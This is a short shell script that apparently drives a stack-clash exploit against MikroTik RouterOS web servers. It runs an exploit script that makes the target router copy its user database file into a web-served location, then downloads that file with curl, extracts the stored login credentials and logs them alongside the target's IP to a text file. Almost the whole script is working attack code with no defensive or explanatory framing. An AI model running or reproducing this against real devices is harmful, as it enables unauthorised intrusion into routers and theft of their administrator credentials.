#1 ip
#2 version
#3 port
#4 model
file=./$2$4
if [ -e "binary/$file" ]; then
    echo "Binary exists"
else 
   ./tools/getROSbin.py $2 $4 /nova/bin/www binary/$2$4
fi

echo "Extracting password to http server..."
./StackClash_$4.py $1 $3 binary/$2$4  "cp /rw/store/user.dat /ram/winbox.idx"
sleep 3
curl_go=`curl --connect-timeout 3 http://$1:$3/winbox/index | ./tools/extract_user.py - `
echo $1 $curl_go >> bambam.txt

echo 'Finish'

